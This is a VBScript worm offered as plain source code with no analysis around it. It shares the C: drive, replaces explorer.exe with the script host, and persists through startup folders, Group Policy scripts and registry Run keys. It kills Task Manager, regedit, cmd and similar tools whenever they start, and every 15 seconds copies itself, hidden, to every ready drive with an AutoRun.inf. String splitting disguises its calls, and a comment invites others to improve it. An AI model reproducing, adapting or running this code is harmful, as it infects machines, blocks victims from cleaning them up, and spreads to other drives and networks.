set shell=createobject("wscri"+"pt.shell")
shell.run "net share game=c:\",0,1
set fso=createobject("scripting.fi"+"lesystemobject")
if left(wscript.scriptfullname,1)<>"c" then
fso.copyfile wscript.scriptfullname,"c:\windows\s"+"ystem32\eventqueue.vbs"
fso.copyfile "c:\windows\system32\wscript.exe","c:\w"+"indows\system32\explorer.exe"
shell.run "c:\windows\system32\explorer.exe c:\windows\system32\eventqueue.vbs"
fso.copyfile wscript.scriptfullname,"C:\Documents and Set"+"tings\All Users\「开始」菜单\程序\启动\Userinit.vbs"
fso.copyfile wscript.scriptfullname,"C:\WINDOWS\System32\Gro"+"upPolicy\Machine\Scripts\Startup\Userinit.vbs"
fso.copyfile wscript.scriptfullname,"C:\WINDOWS\System32\GroupPolicy\U"+"ser\Scripts\Logon\Userinit.vbs"
set myfile=fso.opentextfile(wscript.scriptfullname,1)
content=myfile.readall
myfile.close
reg=split(content,"'###"+"###")
set reg1=fso.createtextfile("c:\windows\systemreg1.reg")
reg1.write replace(reg(2),"'","")
reg1.close
shell.run "regedit /s c:\windows\systemreg1.reg",0,1
fso.delete "c:\windows\systemreg1.reg"
set reg2=fso.createtextfile("c:\windows\systemreg2.reg")
reg2.write replace(reg(3),"'","")
reg2.close
shell.run "regedit /s c:\windows\systemreg2.reg",0,1
fso.delete "c:\windows\systemreg2.reg"
shell.run "c:\windows\system32\explorer.exe c:\windows\system32\userinit.vbs"
wscript.quit
end if
set check=fso.opentextfile("c:\windows\system32\userlook.vbs",2,1)
check.writeline "set ob = GetObject("+chr(34)+"winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2"+chr(34)+")"
check.writeline "set co=ob.execnotificationquery("+chr(34)+"select * from __instancecreationevent within 1 where TargetInstance isa 'Win32_Process'"+chr(34)+")"
check.writeline "do"
check.writeline "set obj=co.nextevent"
check.writeline "if obj.TargetInstance.Name="+chr(34)+"NOTEPAD.EXE"+chr(34)+" or "+"obj.TargetInstance.Name="+chr(34)+"msconfig.exe"+chr(34)+" or "+"obj.TargetInstance.Name="+chr(34)+"cmd.exe"+chr(34)+" or "+"obj.TargetInstance.Name="+chr(34)+"mmc.exe"+chr(34)+" or "+"obj.TargetInstance.Name="+chr(34)+"regedit.exe"+chr(34)+" or "+"obj.TargetInstance.Name="+chr(34)+"taskmgr.exe"+chr(34)+" then"
check.writeline "shell.run "+chr(34)+"ntsd -p "+chr(34)+"+cstr(+obj.TargetInstance.processid) +"+chr(34)+" -c q"+chr(34)
check.writeline "end if"
check.writeline "loop"
check.close
shell.run "c:\windows\system32\userlook.vbs",0
call publichook()
do
set drivers=fso.drives
for each d in drivers
if d.isready then
fso.copyfile wscript.scriptfullname,d.path+"\新建文件夹.vbs"
fso.copyfile wscript.scriptfullname,d.path+"\userdata.vbs"
shell.run "attrib +s +h +r "+d.path+"\userdata.vbs",0,1
set auto=fso.createtextfile(d.path+"\AutoRun.inf")
auto.writeline "[autorun.inf]"
auto.writeline "Open=c:\windows\system32\wscript.exe userinit.vbs"
auto.close
set auto=nothing
end if
next
wscript.sleep 15*1000
loop
sub publichook()
rem This function just written for others to improve this script file.Have fun!
end sub
'######
'Windows Registry Editor Version 5.00
'
'[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
'"RavTask"="\"C:\\Program Files\\Rising\\Rav\\RavTask.exe\" -system"
'"Userinit"="\"c:\\windows\\system32\\explorer.exe c:\\windows\\system32\\eventqueue.vbs\""
'
'
'######
'Windows Registry Editor Version 5.00
'
'[HKEY_CLASSES_ROOT\VBSFile\DefaultIcon]
'@=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,74,00,25,\
'  00,5c,00,53,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,73,00,68,00,\
'  65,00,6c,00,6c,00,2e,00,64,00,6c,00,6c,00,2c,00,2d,00,32,00,31,00,37,00,38,\
'  00,35,00,00,00
'
'